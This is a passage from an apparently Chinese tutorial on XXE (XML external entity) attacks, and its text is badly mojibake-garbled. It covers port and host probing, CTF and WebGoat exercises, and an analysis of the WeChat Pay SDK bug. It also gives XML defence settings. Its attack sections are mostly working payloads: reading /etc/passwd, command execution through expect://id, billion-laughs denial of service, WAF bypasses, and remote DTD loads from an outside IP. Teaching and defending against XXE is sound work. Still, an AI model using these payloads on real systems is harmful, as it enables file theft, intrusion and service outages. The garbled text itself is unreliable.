è¿™é‡Œé¦–å…ˆæµ‹è¯•3389ç«¯å£å’Œ80ç«¯å£ï¼Œæ³¨æ„çœ‹å³ä¸‹è§’çš„å“åº”æ—¶é—´ã€‚ 3.1.3.1.æµ‹è¯•3389ç«¯å£ åœ¨æµ‹è¯•3389ç«¯å£åï¼Œé¡µé¢çš„å“åº”æ—¶é—´ä¸º2312æ¯«ç§’ã€‚ 3.1.3.2.æµ‹è¯•80ç«¯å£ å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æµ‹è¯•80ç«¯å£ï¼Œå“åº”æ—¶é—´ä¸º102æ¯«ç§’ã€‚å½“æˆ‘ä»¬ä½¿ç”¨ç¬¬ä¸€ç§payloadçš„æ—¶å€™åŒæ—¶å­˜åœ¨å›æ˜¾çš„è¯ï¼Œé¡µé¢ä¸­å°±ä¼šæŠŠ80ç«¯å£é¡µé¢ä¸­çš„ä¿¡æ¯ä¹Ÿæ˜¾ç¤ºå‡ºæ¥äº†ï¼Œè¿™é‡Œæµ‹è¯•çš„ç»“æœæ˜¯ä¸æ˜¯å°±å¯ä»¥é—´æ¥æ€§è¯»å–å†…ç½‘ä¸­å…¶å®ƒæœåŠ¡å™¨çš„æ•æ„Ÿæ–‡ä»¶ï¼Ÿ 3.1.4.æµ‹è¯•æœªå¼€æ”¾ç«¯å£ è¿™é‡Œæµ‹è¯•22ç«¯å£ä»¥åŠ23ç«¯å£ï¼Œä¸»è¦çœ‹å³ä¸‹è§’å“åº”æ—¶é—´ï¼ŒåŒæ—¶ä½ ä¹Ÿä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ã€‚ 3.1.4.1.æµ‹è¯•22ç«¯å£ æµ‹è¯•22ç«¯å£åï¼Œå“åº”çš„æ—¶é—´è¾¾åˆ°äº†21ç§’å¤šã€‚ 3.1.4.2.æµ‹è¯•23ç«¯å£ å…¶å®æµ‹è¯•23ç«¯å£åï¼Œå‘ç°åŒæ ·ä¹Ÿæ˜¯21ç§’å¤šã€‚ 3.2.è‡ªåŠ¨åŒ–æ¢æµ‹ç«¯å£ 3.2.1.æŠ“åŒ…å¹¶ä¿®æ”¹ è¿™é‡Œè¿˜æ˜¯ä¸€æ ·å°†æŠ“åˆ°çš„åŒ…ï¼Œå¹¶æ·»åŠ payloadã€‚ 3.2.2.å‘é€æµ‹è¯•å™¨ å°†ä¿®æ”¹å¥½çš„åŒ…å‘é€åˆ°æµ‹è¯•å™¨ä¸­ï¼Œç„¶åè¿›è¡Œçˆ†ç ´ã€‚ 3.2.3.è®¾ç½®å˜åŒ–å†…å®¹ é¦–å…ˆå°†æ‰€æœ‰çš„è‡ªåŠ¨é€‰æ‹©çš„å†…å®¹å…¨éƒ¨æ¸…é™¤ï¼Œç„¶åå°†è®¾å®šè¦å˜åŒ–çš„ç«¯å£ã€‚ 3.2.4.è®¾ç½®è½½è· æˆ‘è¿™é‡Œä¸ºäº†æµ‹è¯•æ–¹ä¾¿ï¼Œæˆ‘å°±éšä¾¿è¾“å…¥å‡ ä¸ªç«¯å£ï¼Œè¾“å…¥ç«¯å£å®Œæˆåï¼Œç‚¹å‡»å¼€å§‹æ”»å‡» 3.2.5.æŸ¥çœ‹æ”»å‡»æ•ˆæœ è¿™é‡Œé¦–å…ˆéœ€è¦å°†åˆ—ä¸­æ¥å—å“åº”è®¡æ•°å‹¾ä¸Šï¼Œç„¶åç‚¹å‡»æ¥å—å“åº”è®¡æ•°ï¼Œå°±ä¼šè‡ªåŠ¨å°†æœ€çŸ­çš„å“åº”æ—¶é•¿æ’åœ¨å‰é¢ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¤Ÿå®Œæˆè‡ªåŠ¨åŒ–æµ‹è¯•äº†ï¼Œæ— éœ€æ‰‹åŠ¨æµ‹è¯•ï¼Œè¿™é‡Œæ˜¾ç¤ºæœ‰å››ä¸ªæ—¶é•¿çŸ­çš„ 3.3.æ€»ç»“ ä»å“åº”çš„æ—¶é—´å¯¹æ¯”ï¼Œå…¶å®ä¸éš¾çœ‹å‡ºï¼Œå½“ç«¯å£å¼€æ”¾çš„æ—¶å€™å°±å¯ä»¥å“åº”æ—¶é—´å°±æ¯”è¾ƒå¿«ï¼Œè€Œç«¯å£æœªå¼€æ”¾çš„æ—¶å€™å“åº”æ—¶é—´å°±æ¯”è¾ƒé•¿ã€‚ åã€æ¢æµ‹ä¸»æœºå­˜æ´» è¿™é‡Œçš„æ¢æµ‹ä¸»æœºå­˜æ´»ä½¿ç”¨payloadçš„ä»¥åŠåˆ¤æ–­å’Œæ¢æµ‹ç«¯å£æ˜¯åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å°†åé¢çš„ç«¯å£å–æ¶ˆï¼Œè¿™é‡Œå°±æ”¾ä¸€ä¸ªpayloadï¼Œéœ€è¦æ³¨æ„å“¦ï¼Œè¿™é‡Œæ˜¯åŸºäºxxelabsé¶åœºæ„å»ºçš„payloadçš„ã€‚æ­£å¸¸çš„payloadå¯ä»¥çœ‹æ¢æµ‹ç«¯å£æ¡ˆä¾‹ä¸­æ„å»ºçš„ç¬¬äºŒä¸ªpayloadï¼Œé‚£ä¸ªæ‰æ˜¯æ­£å¸¸çš„ã€‚ payloadï¼š &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM \"http://192.168.10.51\" &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 4.1.è‡ªåŠ¨åŒ–æ¢æµ‹ä¸»æœºå­˜æ´» è¿™é‡Œæˆ‘å°±ä¸æ¼”ç¤ºæ‰‹åŠ¨æµ‹è¯•çš„äº†ï¼Œåªæ¼”ç¤ºè‡ªåŠ¨åŒ–çš„ã€‚ 4.1.1.è®¾ç½®å˜åŒ–å†…å®¹ è¿™é‡Œé€‰ä¸­ä¸»æœºçš„æœ€åä¸€ä½ï¼Œè®¾ç½®ä¸ºå˜åŒ–çš„å†…å®¹ã€‚ 4.1.2.è®¾ç½®è½½è· è¿™é‡Œç”±äºæˆ‘å°±å¼€ä¸€å°æœåŠ¡å™¨ï¼Œæ˜¯185.243.241.45ï¼Œæˆ‘ä»¬æ·»åŠ 45ä½†56ä¸43æˆ‘éƒ½æ²¡å¼€å¯ã€‚ï¼ˆç¦»è°±çš„æ˜¯æˆ‘æ²¡æœ‰40è¿™ä¸ªä¸»æœºï¼Œä½†å´æœ‰å“åº”ï¼Œä¼°è®¡æ˜¯åˆ«äººçš„ï¼Ÿï¼‰ 4.1.3.æŸ¥çœ‹æ”»å‡»æ•ˆæœ ä»æ”»å‡»çš„æ•ˆæœçš„å“åº”æ—¶é•¿æ¥çœ‹ï¼Œä¹Ÿå°±45ã€40çš„é€šçš„ï¼Œå…¶å®ƒéƒ½æ˜¯ä¸é€šçš„ã€‚ åä¸€ã€æ›´æ”¹Content-Typeç±»å‹ è¿™é‡Œå°±æ˜¯è§£é‡Šåœ¨xxeçš„ç›²çŒœï¼Œåœ¨ä¸ç¡®å®šæ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œçš„æ—¶å€™ï¼Œé€šè¿‡ä¿®æ”¹Content-Typeå¤´ï¼Œè®©å…¶èƒ½å¤Ÿè¯†åˆ«xmlçš„è¯­å¥ï¼Œå®ç°æ¼æ´åˆ©ç”¨ã€‚æ›´æ”¹Content-Typeå¤´ç±»å‹æœ‰ï¼šapplication/xmlä¸text/xmlã€‚ 5.1.CTFé¢˜ç›®æ¡ˆä¾‹ CTF-Jarvis-OJ-Web-XXE(CTFé¢˜)è®¿é—®åœ°å€ 5.1.1.æŠ“åŒ… é€šè¿‡æŠ“åŒ…å‘ç°è¯¥é¶åœºçš„æ•°æ®çš„ä¼ è¾“æ–¹å¼æ˜¯jsonã€‚ 5.1.2.ä¿®æ”¹ç±»å‹ è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†ç±»å‹ä¿®æ”¹ä¸ºxmlã€‚ 5.1.3.æ„å»ºpayload è¿™é‡Œéœ€è¦å°†åŸå…ˆä¸‹é¢è¾“å‡ºçš„å†…å®¹ç»™åˆ é™¤ï¼Œç„¶åè¾“å…¥ä¸Špayloadã€‚ payloadï¼š &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\" &gt; ]&gt; &lt;x&gt;&amp;b;&lt;/x&gt; 5.1.4.æµ‹è¯•æ•ˆæœ è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸè¯»å–åˆ°etcä¸‹çš„passwdå†…å®¹ã€‚ åäºŒã€å†…ç½‘æ¢æµ‹ å’Œè¯»æ–‡ä»¶å·®ä¸å¤šï¼Œåªä¸è¿‡æŠŠURIæ”¹æˆå†…ç½‘æœºå™¨åœ°å€ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY rabbit SYSTEM \"http://127.0.0.1/1.txt\" &gt; ]&gt; &lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt; åä¸‰ã€RCE XXEæ¼æ´åˆ©ç”¨æŠ€å·§ï¼šä»XMLåˆ°è¿œç¨‹ä»£ç æ‰§è¡Œ è¿™ç§æƒ…å†µå¾ˆå°‘å‘ç”Ÿï¼Œä½†æœ‰äº›æƒ…å†µä¸‹æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡XXEæ‰§è¡Œä»£ç ï¼Œè¿™ä¸»è¦æ˜¯ç”±äºé…ç½®ä¸å½“/å¼€å‘å†…éƒ¨åº”ç”¨å¯¼è‡´çš„ã€‚å¦‚æœæˆ‘ä»¬è¶³å¤Ÿå¹¸è¿ï¼Œå¹¶ä¸”PHP expectæ¨¡å—è¢«åŠ è½½åˆ°äº†æ˜“å—æ”»å‡»çš„ç³»ç»Ÿæˆ–å¤„ç†XMLçš„å†…éƒ¨åº”ç”¨ç¨‹åºä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤ï¼š &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM \"expect://id\" &gt;]&gt; &lt;catalog&gt; &lt;core id=\"test101\"&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;title&gt;I love XML&lt;/title&gt; &lt;category&gt;Computers&lt;/category&gt; &lt;price&gt;9.99&lt;/price&gt; &lt;date&gt;2018-10-01&lt;/date&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;/core&gt; &lt;/catalog&gt; å“åº”ï¼š {\"error\": \"no results for description uid=0(root) gid=0(root) groups=0(root)... åå››ã€DOS XXEèŒæ–°è¿›é˜¶å…¨æ”»ç•¥ &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol \"lol\"&gt; &lt;!ENTITY lol2 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt; &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt; &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt; &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\"&gt; &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt; &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt; &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt; &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; æ­¤æµ‹è¯•å¯ä»¥åœ¨å†…å­˜ä¸­å°†å°å‹ XML æ–‡æ¡£æ‰©å±•åˆ°è¶…è¿‡ 3GB è€Œä½¿æœåŠ¡å™¨å´©æºƒã€‚ äº¦æˆ–è€…ï¼Œå¦‚æœç›®æ ‡æ˜¯UNIXç³»ç»Ÿï¼Œ &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM \"file:///dev/random\" &gt;]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; å¦‚æœ XML è§£æå™¨å°è¯•ä½¿ç”¨/dev/randomæ–‡ä»¶ä¸­çš„å†…å®¹æ¥æ›¿ä»£å®ä½“ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¼šä½¿æœåŠ¡å™¨ï¼ˆä½¿ç”¨ UNIX ç³»ç»Ÿï¼‰å´©æºƒã€‚ åäº”ã€ç»•è¿‡å§¿åŠ¿ å‚è€ƒcl4yå¸ˆå‚…åšå®¢xxeç¬”è®° ç»•è¿‡WAFä¿æŠ¤çš„XXE ENTITY``SYSTEM``fileç­‰å…³é”®è¯è¢«è¿‡æ»¤ ä½¿ç”¨ç¼–ç æ–¹å¼ç»•è¿‡ï¼šUTF-16BE cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml è‹¥httpè¢«è¿‡æ»¤ï¼Œå¯ä»¥ 6.1.data://åè®®ç»•è¿‡ &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % a \" &lt;!ENTITY % b SYSTEM 'http://118.25.14.40:8200/hack.dtd'&gt; \"&gt; %a; %b; ]&gt; &lt;test&gt;&amp;hhh;&lt;/test&gt; 6.2.file://åè®®æ–‡ä»¶ä¸Šä¼  &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM \"file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\"&gt; %a; ]&gt; &lt;!--ä¸Šä¼ æ–‡ä»¶--&gt; &lt;!ENTITY % b SYSTEM 'http://118.25.14.40:8200/hack.dtd'&gt; 6.3.php://filteråè®®æ–‡ä»¶ä¸Šä¼  &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM \"php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\"&gt; %a; ]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--ä¸Šä¼ æ–‡ä»¶--&gt; &lt;!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'&gt; &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM \"php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\"&gt; %a; ]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--ä¸Šä¼ æ–‡ä»¶--&gt; PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg== 6.4 å…¶ä»– æ–¹æ³•1ï¼šæ–‡æ¡£ä¸­çš„é¢å¤–ç©ºæ ¼ æ–¹æ³•2ï¼šæ ¼å¼æ— æ•ˆ æ–¹æ³•3: å¤–æ¥ç¼–ç ï¼ˆExotic encodingsï¼‰ æ–¹æ³•4ï¼šåœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç  å‚è€ƒï¼šhttps://xz.aliyun.com/t/4059 --ç»•è¿‡æ–¹æ³• åå…­ã€åˆ©ç”¨åœºæ™¯ 7.1.svg &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY file SYSTEM \"file:///proc/self/cwd/flag.txt\" &gt; ]&gt; &lt;svg height=\"100\" width=\"1000\"&gt; &lt;text x=\"10\" y=\"20\"&gt;&amp;file;&lt;/text&gt; &lt;/svg&gt; tips:ä»å½“å‰æ–‡ä»¶å¤¹è¯»å–æ–‡ä»¶å¯ä»¥ä½¿ç”¨/proc/self/cwd 7.2.excel åˆ©ç”¨EXCELè¿›è¡ŒXXEæ”»å‡» é¦–å…ˆç”¨excelåˆ›å»ºä¸€ä¸ªç©ºç™½çš„xlsxï¼Œç„¶åè§£å‹ mkdir XXE &amp;&amp; cd XXE unzip ../XXE.xlsx å°†[Content_Types].xmlæ”¹æˆæ¶æ„xmlï¼Œå†å‹ç¼©å›å» zip -r ../poc.xlsx * 7.3 å¾®ä¿¡æ”¯ä»˜æ¼æ´åˆ†æ å®ä¾‹äºŒï¼šå¾®ä¿¡æ”¯ä»˜çš„ XXE å‰ä¸€é˜µå­éå¸¸ç«çš„å¾®ä¿¡æ”¯ä»˜çš„ XXE æ¼æ´å½“ç„¶ä¸å¾—ä¸æï¼Œå½“ç„¶ç›®å‰æˆ‘æ˜¯çœ‹ä¸æ‡‚çš„ï¼Œæ‰€ä»¥å°±å…ˆäº†è§£ä¸€ä¸‹ æ¼æ´æè¿°ï¼š å¾®ä¿¡æ”¯ä»˜æä¾›äº†ä¸€ä¸ª api æ¥å£ï¼Œä¾›å•†å®¶æ¥æ”¶å¼‚æ­¥æ”¯ä»˜ç»“æœï¼Œå¾®ä¿¡æ”¯ä»˜æ‰€ç”¨çš„java sdkåœ¨å¤„ç†ç»“æœæ—¶å¯èƒ½è§¦å‘ä¸€ä¸ªXXEæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å‘è¿™ä¸ªæ¥å£å‘é€æ„é€ æ¶æ„payloads,è·å–å•†å®¶æœåŠ¡å™¨ä¸Šçš„ä»»ä½•ä¿¡æ¯ï¼Œä¸€æ—¦æ”»å‡»è€…è·å¾—äº†æ•æ„Ÿçš„æ•°æ® (md5-key and merchant-Id etc.)ï¼Œä»–å¯èƒ½é€šè¿‡å‘é€ä¼ªé€ çš„ä¿¡æ¯ä¸ç”¨èŠ±é’±å°±è´­ä¹°å•†å®¶ä»»æ„ç‰©å“ ä¸‹è½½ java ç‰ˆæœ¬çš„ sdk è¿›è¡Œåˆ†æï¼Œè¿™ä¸ª sdk æä¾›äº†ä¸€ä¸ª WXPayUtil å·¥å…·ç±»ï¼Œè¯¥ç±»ä¸­å®ç°äº†xmltoMapå’ŒmaptoXmlè¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œè€Œè¿™æ¬¡çš„å¾®ä¿¡æ”¯ä»˜çš„xxeæ¼æ´çˆ†å‘ç‚¹å°±åœ¨xmltoMapæ–¹æ³•ä¸­ å¦‚å›¾æ‰€ç¤ºï¼š é—®é¢˜å°±å‡ºç°åœ¨æ¨ªçº¿åˆ’å‡ºæ¥çš„é‚£éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ç®€åŒ–ä¸ºä¸‹é¢çš„ä»£ç ï¼š public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception { try { Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder(); InputStream stream = new ByteArrayInputStream(strXML.getBytes(\"UTF-8\")); org.w3c.dom.Document doc = documentBuilder.parse(stream); ... å¯ä»¥çœ‹åˆ° å½“æ„å»ºäº† documentBuilder ä»¥åå°±ç›´æ¥å¯¹ä¼ è¿›æ¥çš„ strXML è§£æäº†ï¼Œè€Œä¸å·§çš„æ˜¯ strXML æ˜¯ä¸€å¤„æ”»å‡»è€…å¯æ§çš„å‚æ•°ï¼Œäºæ˜¯å°±å‡ºç°äº† XXE æ¼æ´ï¼Œä¸‹é¢æ˜¯å®éªŒçš„æ­¥éª¤ é¦–å…ˆåœ¨ com åŒ…ä¸‹åˆæ–°å»ºäº†ä¸€ä¸ªåŒ…ï¼Œæ¥å†™æµ‹è¯•ä»£ç ï¼Œæµ‹è¯•ä»£ç å‘½åä¸º test001.java å¦‚å›¾æ‰€ç¤ºï¼š test001.java package com.test.test001; import java.util.Map; import static com.github.wxpay.sdk.WXPayUtil.xmlToMap; public class test001 { public static void main(String args[]) throws Exception { String xmlStr =\"&lt;?xml version='1.0' encoding='utf-8'?&gt;\\r \" + \"&lt;!DOCTYPE XDSEC [\\r \" + \"&lt;!ENTITY xxe SYSTEM 'file:///d:/1.txt'&gt;]&gt;\\r \" + \"&lt;XDSEC&gt;\\r \"+ \"&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\\r \" + \"&lt;/XDSEC&gt;\"; try{ Map&lt;String,String&gt; test = xmlToMap(xmlStr); System.out.println(test); }catch (Exception e){ e.printStackTrace(); } } } å¸Œæœ›å®ƒèƒ½è¯»å– D ç›˜ä¸‹é¢çš„ 1.txt æ–‡ä»¶ è¿è¡ŒåæˆåŠŸè¯»å– å¦‚å›¾æ‰€ç¤ºï¼š å½“ç„¶ï¼ŒWXPayXmlUtil.java ä¸­æœ‰è¿™ä¸ª sdk çš„é…ç½®é¡¹ï¼Œèƒ½ç›´æ¥å†³å®šå®éªŒçš„æ•ˆæœï¼Œå½“ç„¶åæœŸçš„ä¿®å¤ä¹Ÿæ˜¯é’ˆå¯¹è¿™é‡Œé¢è¿›è¡Œä¿®å¤çš„ http://apache.org/xml/features/disallow-doctype-decl true http://apache.org/xml/features/nonvalidating/load-external-dtd false http://xml.org/sax/features/external-general-entities false http://xml.org/sax/features/external-parameter-entities false æ•´ä¸ªæºç é‚£ä½å¸ˆå‚…æ‰“åŒ…å¥½äº†å·²ç»ä¸Šä¼ ç™¾åº¦äº‘ï¼š é“¾æ¥ï¼šhttps://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw æå–ç ï¼šxq1b ä¸Šé¢è¯´è¿‡ java ä¸­æœ‰ä¸€ä¸ª netdoc:/ åè®®èƒ½ä»£æ›¿ file:/// å¦‚å›¾æ‰€ç¤ºï¼š åä¸ƒã€XXEæ¼æ´é˜²å¾¡ 8.1.ç¦ç”¨å¤–éƒ¨å®ä½“ ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•ã€‚ PHPï¼š libxml_disable_entity_loader(true); java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Pythonï¼š from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 8.2.è¿‡æ»¤æ•°æ® å¯ä»¥å°†ç”¨æˆ·æäº¤çš„xmlæ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œä¾‹å¦‚å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLICã€‚ åå…«ã€WebGoaté¶åœºç»ƒä¹  å…³å¡ä¸€ ç¬¬ä¸€å…³æ˜¯è®©æˆ‘ä»¬åœ¨æäº¤è¡¨å•ä¹‹åï¼Œå°è¯•é€šè¿‡åˆ©ç”¨xxeæ¼æ´è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ¥åˆ—ä¸¾å¯¹åº”æœåŠ¡å™¨ä¸Šçš„æ ¹ç›®å½• bpæŠ“åŒ…ä¹‹åå‘ç°ï¼Œè¿™é‡Œæ˜¯å¯ä»¥è§£æxmlçš„ï¼Œé‚£æˆ‘ä»¬ç›´æ¥æ„é€ payloadå³å¯ &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY rabbit SYSTEM \"file:///\" &gt;]&gt; &lt;comment&gt;&lt;text&gt;&amp;rabbit;&lt;/text&gt;&lt;/comment&gt; è¿™é‡Œæç¤ºæˆ‘ä»¬æˆåŠŸåˆ—ä¸¾ï¼ŒåŒæ—¶åˆ·æ–°ç½‘é¡µä¹‹åä¼šå‘ç°ï¼Œåˆ—ä¸¾å‡ºæ¥çš„å†…å®¹å›æ˜¾åˆ°äº†é¡µé¢ä¸­ ä»£ç åˆ†æ çœ‹ä¸€ä¸‹é¡µé¢è·¯ç”±ï¼Œæ‰¾åˆ°javaé¡¹ç›®å¯¹åº”ä½ç½® å…ˆè§£é‡Šä¸‹ä¸Šè¿°ä»£ç æ¶‰åŠåˆ°çš„æ³¨è§£çš„å«ä¹‰ï¼š æ³¨é‡Š å«ä¹‰ @Autowired æ§åˆ¶å¦‚ä½•å®Œæˆè‡ªåŠ¨è¿æ¥æˆ–åŠ è½½ @AssignmentPath(â€œxxe/simpleâ€) æ¥æ”¶å¹¶å¤„ç†å‘å¾€xxe/simpleçš„HTTPè¯·æ±‚ @RequestMapping(method = POST, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE) é…ç½® url æ˜ å°„ @ResponseBody è¡¨ç¤ºè¯¥æ–¹æ³•çš„è¿”å›ç»“æœç›´æ¥å†™å…¥ HTTP è¿”å›åŒ…çš„æ­£æ–‡ä¸­ @RequestBody String commentStr è¡¨ç¤ºå°†è¯·æ±‚ä¸­çš„æ•°æ®å†™å…¥åˆ° commentStr è¿™ä¸ª String å¯¹è±¡ä¸­ å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šæ¥å—postè¯·æ±‚ä¸­æ­£æ–‡çš„å†…å®¹ï¼Œèµ‹å€¼ç»™commentstrå‚æ•°ï¼Œæ¥ç€å…ˆåˆ¤æ–­sessionä¸­æ˜¯å¦å‡½æ•°å±æ€§ï¼šapplysecurityï¼Œæ¥ç¡®å®šsecureçš„å¸ƒå°”å€¼ï¼Œæ¥ç€è°ƒç”¨commentç±»çš„parsexmlå‡½æ•°ï¼Œå¯¹è¯¥å‚æ•°å†…å®¹è¿›è¡Œxmlè§£æ æˆ‘ä»¬æ¥ç€è·Ÿè¸ªè¯¥å‡½æ•°çœ‹çœ‹å…·ä½“å®ç°ï¼š å…ˆäº†è§£ä¸€ä¸‹å‰ç½®çŸ¥è¯†ï¼šä¸»è¦å…³æ³¨ JAXB JAXBContext å‰ç½®çŸ¥è¯†ï¼šJAXB ä½œä¸º JDK çš„ä¸€éƒ¨åˆ†ï¼Œèƒ½ä¾¿æ·åœ°å°† Java å¯¹è±¡ä¸ XML è¿›è¡Œç›¸äº’è½¬æ¢ã€‚ JAXBContext æ˜¯æ•´ä¸ª JAXB API çš„å…¥å£ã€‚ä¸»è¦ç”¨æ¥æ„å»º JAXB å®ä¾‹newInstance()ã€‚ Marshalleræ¥å£ï¼Œå°†Javaå¯¹è±¡åºåˆ—åŒ–ä¸ºXMLæ•°æ®ã€‚ Unmarshalleræ¥å£ï¼Œå°†XMLæ•°æ®ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡ã€‚ JAXBContext.newInstance(Comment.class) çš„ä½œç”¨æ˜¯å°† Comment è¿™ä¸ªå¯¹è±¡è¿›è¡Œå®ä¾‹åŒ–ï¼Œåˆ›å»ºä¸€ä¸ª JAXB å®ä¾‹ï¼›å®ä¾‹åå­—åœ¨æœ¬ä»£ç ä¸­ä¸º jcã€‚ æ¥ç€æˆ‘ä»¬å…³æ³¨ä»£ç ä¸­çš„ï¼š è¿™é‡Œé€šè¿‡è®¾ç½®XMLConstantsçš„å±æ€§æ¥ç¡®å®šæ˜¯å¦å…è®¸è§£æå¤–éƒ¨DTDï¼Œå…¶ä¸­å¯¹äºè¿™ä¸¤ä¸ªå±æ€§çš„è§£é‡Šå¦‚ä¸‹ï¼š å¯ä»¥é€šè¿‡è®¾ç½®XMLConstantsçš„ä¸¤ä¸ªå±æ€§æ¥ç¦ç”¨å¤–éƒ¨å®ä½“è§£æï¼Œé»˜è®¤çš„ç©ºå­—ç¬¦ä¸²å°±æ˜¯ç¦ç”¨ï¼Œä½†æ˜¯è¿™é‡Œsecureå€¼ä¸ºtrue,æ‰€ä»¥æ²¡æœ‰ç¦ç”¨ï¼ˆSimpleXXE.javaï¼‰ è¿™é‡Œå°±æ‡µé€¼äº†ï¼Œä¸æ˜¯è¯´ç©ºå­—ç¬¦ä¸²æ‰æ˜¯ç¦ç”¨å—ï¼Œé‚£è¿™é‡ŒæŒ‰é“ç†åº”è¯¥æ˜¯secureå€¼ä¸ºfalseå•Šï¼Œè¿™æ 